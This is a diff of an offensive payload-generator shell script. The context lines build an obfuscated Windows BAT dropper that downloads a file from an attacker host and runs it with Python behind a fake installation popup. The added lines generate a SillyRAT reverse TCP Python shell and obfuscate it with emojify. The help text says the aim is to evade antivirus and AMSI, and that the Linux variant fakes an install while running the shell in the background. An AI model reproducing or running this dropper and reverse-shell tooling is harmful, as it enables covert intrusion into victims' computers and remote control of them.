@@ -10339,7 +10339,7 @@ if [ "$SOSP" = "Windows" ]; then
       echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
       echo "@Po%@i%wE^r%@i%s^He%@i%ll (nE%@%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",5,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
       echo "=pOw^e%@%rS^hE%@%lL -e^X%@%e\"C\" b%@%Y\"p\"a^S%@%s %\$\$% (nE%@%W-Obj%@%eCt N%i%Et%#?%WeBCl%@%iE^n%@%t)%#?%Dow%@%nL^oa%@%dFIl%@%E('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@_%& ,(,;(c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%),)" >> $Drop.bat
-      echo "${BlueF}[☠]${white} Written $Drop.bat (Obfuscated)"${Reset};sleep 2
+      echo "${BlueF}[☠]${white} Written $Drop.bat (obfuscated)"${Reset};sleep 2
 
    else
 
@@ -10437,6 +10437,22 @@ cd $IPATH/bin/SillyRAT
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
 xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
+
+
+cd $IPATH/output
+## Make sure emojify obfuscator its installed
+# Author: @chris-rands (https://github.com/chris-rands/emojify)
+if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
+   audit=$(pip3 show emojify) > /dev/null 2>&1
+   if [ "$?" -ne "0" ]; then
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify python obfuscator."${Reset};sleep 2
+      echo "" && sudo apt-get update && pip3 install emojify && echo ""
+   fi
+   ## Obfuscate Client.py sourcecode using emojify
+   emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1
+   mv obfuscated.py $Drop.py > /dev/nul 2>&1
+   echo "${BlueF}[☠]${white} $Drop.py Obfuscated (emojify)"${Reset};sleep 2
+fi
 
 
 cd $IPATH/templates/phishing
@@ -12431,7 +12447,8 @@ cat << !
     DESCRIPTION: Reverse TCP python Shell (SillyRAT)
     OBFUSCATION: Activated or NOT, (default settings for this categorie)
 
-    In-Windows : This setting obfuscates BAT dropper to evade AV/amsi detection.
+    In-Windows : This setting obfuscates the BAT dropper to evade AV/amsi detection
+                 and emojify to obfuscate Client.py sourcecode to bypass detection.
     In-Linux   : In Linux targets the dropper will fake the installation of the
                  input FileName and at the same time executes our reverse python
                  tcp shell in background (in a child process detach from parent).
